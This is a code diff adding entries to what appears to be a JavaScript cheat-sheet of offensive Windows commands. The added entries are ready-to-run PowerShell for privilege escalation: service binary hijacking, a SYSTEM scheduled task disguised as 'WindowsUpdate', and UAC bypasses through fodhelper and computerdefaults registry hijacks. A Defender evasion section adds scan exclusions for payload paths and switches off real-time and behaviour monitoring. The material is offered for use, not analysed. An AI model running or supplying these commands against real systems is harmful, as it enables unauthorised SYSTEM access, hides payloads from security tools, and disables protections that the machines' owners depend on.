@@ -4370,6 +4370,131 @@ const COMMANDS = [
     tags: ["cmd", "evasion"],
     accent: "#607d8b"
   },
+  // ═══════════════════════════════════════════════════════════════
+  // PRIVESC - No Potato (Defender-safe alternatives)
+  // ═══════════════════════════════════════════════════════════════
+  {
+    title: "[PRIVESC] Find Weak Service Permissions",
+    desc: "Find services with weak DACLs. Look for BUILTIN\\Users with SERVICE_ALL_ACCESS.",
+    code: "Get-WmiObject Win32_Service | ForEach-Object { $svc = $_.Name; $acl = (sc.exe sdshow $svc 2>$null); if ($acl -match 'A;;CCLCSWRPWPDTLOCRRC;;;BU|A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BU') { Write-Host \"[VULN] $svc\" } }",
+    tags: ["ps", "privesc", "recon"],
+    accent: "#9b59b6"
+  },
+  {
+    title: "[PRIVESC] Unquoted Service Paths",
+    desc: "Find services with unquoted paths containing spaces. Classic privesc.",
+    code: "Get-WmiObject Win32_Service | Where-Object { $_.PathName -notmatch '^\"|^''' -and $_.PathName -match ' ' -and $_.PathName -notmatch 'System32' } | Select Name,PathName,StartMode | Format-List",
+    tags: ["ps", "privesc", "recon"],
+    accent: "#9b59b6"
+  },
+  {
+    title: "[PRIVESC] Writable Service Binaries",
+    desc: "Find service EXEs you can overwrite. Replace with payload.",
+    code: "$paths = (Get-WmiObject Win32_Service).PathName | ForEach-Object { ($_ -split '\"')[1]; ($_ -split ' ')[0] } | Where-Object { $_ -and (Test-Path $_) } | Sort-Object -Unique\nforeach ($p in $paths) { $acl = Get-Acl $p -ErrorAction SilentlyContinue; if ($acl.AccessToString -match 'Users.*Modify|Users.*FullControl|Everyone') { Write-Host \"[VULN] $p\" } }",
+    tags: ["ps", "privesc", "recon"],
+    accent: "#9b59b6"
+  },
+  {
+    title: "[PRIVESC] AlwaysInstallElevated Check",
+    desc: "If both keys are 1, MSI installs run as SYSTEM. Create malicious MSI.",
+    code: "$hklm = (Get-ItemProperty 'HKLM:\\Software\\Policies\\Microsoft\\Windows\\Installer' -Name AlwaysInstallElevated -ErrorAction SilentlyContinue).AlwaysInstallElevated\n$hkcu = (Get-ItemProperty 'HKCU:\\Software\\Policies\\Microsoft\\Windows\\Installer' -Name AlwaysInstallElevated -ErrorAction SilentlyContinue).AlwaysInstallElevated\nif ($hklm -eq 1 -and $hkcu -eq 1) { '[VULN] AlwaysInstallElevated enabled!' } else { '[-] Not vulnerable' }",
+    tags: ["ps", "privesc", "recon"],
+    accent: "#9b59b6"
+  },
+  {
+    title: "[PRIVESC] Scheduled Task Write",
+    desc: "Find scheduled tasks you can modify. Hijack to run as SYSTEM.",
+    code: "Get-ScheduledTask | ForEach-Object { $task = $_.TaskName; $path = $_.TaskPath; try { $info = Get-ScheduledTaskInfo -TaskName $task -TaskPath $path -ErrorAction Stop; $principal = (Get-ScheduledTask -TaskName $task -TaskPath $path).Principal; if ($principal.RunLevel -eq 'Highest') { Write-Host \"[HIGH] $path$task runs elevated\" } } catch {} }",
+    tags: ["ps", "privesc", "recon"],
+    accent: "#9b59b6"
+  },
+  {
+    title: "[PRIVESC] Create SYSTEM Scheduled Task",
+    desc: "Create scheduled task that runs as SYSTEM. Requires admin.",
+    code: "$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-ep bypass -f C:\\Windows\\Temp\\sys.ps1'\n$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1)\n$principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest\nRegister-ScheduledTask -TaskName 'WindowsUpdate' -Action $action -Trigger $trigger -Principal $principal -Force",
+    tags: ["ps", "privesc"],
+    accent: "#9b59b6"
+  },
+  {
+    title: "[PRIVESC] Service Binary Hijack",
+    desc: "Replace vulnerable service EXE with payload. Service restarts = SYSTEM shell.",
+    code: "$target = 'C:\\path\\to\\vuln\\service.exe'\n$backup = \"$target.bak\"\nMove-Item $target $backup -Force\n# Create payload that runs reverse shell then starts original\n\"Start-Process powershell -Arg '-ep bypass -f C:\\Windows\\Temp\\sys.ps1' -WindowStyle Hidden; Start-Process '$backup'\" | Out-File C:\\Windows\\Temp\\hijack.ps1\n# Compile to EXE or use InstallUtil bypass",
+    tags: ["ps", "privesc"],
+    accent: "#9b59b6"
+  },
+  {
+    title: "[PRIVESC] Token Impersonation (No Potato)",
+    desc: "If SeImpersonatePrivilege, use named pipe impersonation. Pure PowerShell.",
+    code: "whoami /priv | Select-String 'SeImpersonate|SeAssignPrimaryToken'\n# If enabled, can impersonate via named pipe\n# Or use: https://github.com/decoder-it/psgetsystem",
+    tags: ["ps", "privesc", "recon"],
+    accent: "#9b59b6"
+  },
+  {
+    title: "[PRIVESC] Check Current Privileges",
+    desc: "List token privileges. Look for SeImpersonate, SeAssignPrimaryToken, SeDebug.",
+    code: "whoami /priv | Select-String 'Enabled'\nwhoami /groups | Select-String 'Admin|SYSTEM|Backup'",
+    tags: ["ps", "privesc", "recon"],
+    accent: "#9b59b6"
+  },
+  {
+    title: "[PRIVESC] UAC Bypass fodhelper",
+    desc: "Bypass UAC via fodhelper registry hijack. Works on Win10/11.",
+    code: "New-Item 'HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command' -Force | Out-Null\nNew-ItemProperty -Path 'HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command' -Name 'DelegateExecute' -Value '' -Force | Out-Null\nSet-ItemProperty -Path 'HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command' -Name '(default)' -Value 'powershell -ep bypass -f C:\\Windows\\Temp\\sys.ps1' -Force\nStart-Process fodhelper.exe -WindowStyle Hidden\nStart-Sleep 3\nRemove-Item 'HKCU:\\Software\\Classes\\ms-settings' -Recurse -Force",
+    tags: ["ps", "privesc"],
+    accent: "#9b59b6"
+  },
+  {
+    title: "[PRIVESC] UAC Bypass computerdefaults",
+    desc: "Alternative UAC bypass via computerdefaults.exe.",
+    code: "New-Item 'HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command' -Force | Out-Null\nNew-ItemProperty -Path 'HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command' -Name 'DelegateExecute' -Value '' -Force | Out-Null\nSet-ItemProperty -Path 'HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command' -Name '(default)' -Value 'cmd /c start powershell -ep bypass -f C:\\Windows\\Temp\\sys.ps1' -Force\nStart-Process computerdefaults.exe\nStart-Sleep 3\nRemove-Item 'HKCU:\\Software\\Classes\\ms-settings' -Recurse -Force",
+    tags: ["ps", "privesc"],
+    accent: "#9b59b6"
+  },
+  // ═══════════════════════════════════════════════════════════════
+  // DEFENDER EVASION - Tested techniques
+  // ═══════════════════════════════════════════════════════════════
+  {
+    title: "[EVASION] Check Defender Exclusions",
+    desc: "Find excluded paths. Drop payloads there to avoid scanning.",
+    code: "(Get-MpPreference).ExclusionPath\n(Get-MpPreference).ExclusionExtension\n(Get-MpPreference).ExclusionProcess",
+    tags: ["ps", "evasion", "recon"],
+    accent: "#e91e63"
+  },
+  {
+    title: "[EVASION] Add Defender Exclusion",
+    desc: "Add exclusion for your payload path. Requires admin.",
+    code: "Add-MpPreference -ExclusionPath 'C:\\Windows\\Temp'\nAdd-MpPreference -ExclusionExtension '.ps1'\nAdd-MpPreference -ExclusionProcess 'powershell.exe'",
+    tags: ["ps", "evasion"],
+    accent: "#e91e63"
+  },
+  {
+    title: "[EVASION] Disable Defender (Admin)",
+    desc: "Disable real-time protection. Requires admin. May be monitored.",
+    code: "Set-MpPreference -DisableRealtimeMonitoring $true\nSet-MpPreference -DisableBehaviorMonitoring $true\nSet-MpPreference -DisableIOAVProtection $true",
+    tags: ["ps", "evasion"],
+    accent: "#e91e63"
+  },
+  {
+    title: "[EVASION] Check What Defender Caught",
+    desc: "View recent Defender detections. See what triggered.",
+    code: "Get-MpThreatDetection | Sort-Object InitialDetectionTime -Descending | Select-Object -First 10 ThreatID,Resources,ActionSuccess | Format-List",
+    tags: ["ps", "evasion", "recon"],
+    accent: "#e91e63"
+  },
+  {
+    title: "[EVASION] Defender Full Status",
+    desc: "Check all Defender protection states.",
+    code: "Get-MpComputerStatus | Select RealTimeProtectionEnabled,BehaviorMonitorEnabled,IoavProtectionEnabled,OnAccessProtectionEnabled,IsTamperProtected",
+    tags: ["ps", "evasion", "recon"],
+    accent: "#e91e63"
+  },
+  {
+    title: "[EVASION] Potato Fails? Use This",
+    desc: "When PrintSpoofer/GodPotato blocked, try UAC bypass + scheduled task instead.",
+    code: "# 1. UAC bypass to get elevated\n# 2. Create SYSTEM scheduled task\n# 3. Task executes payload as SYSTEM\n# No potato EXE needed - pure PowerShell",
+    tags: ["ps", "evasion", "privesc"],
+    accent: "#e91e63"
+  },
 ];
 
 const list = document.getElementById('cmdList');
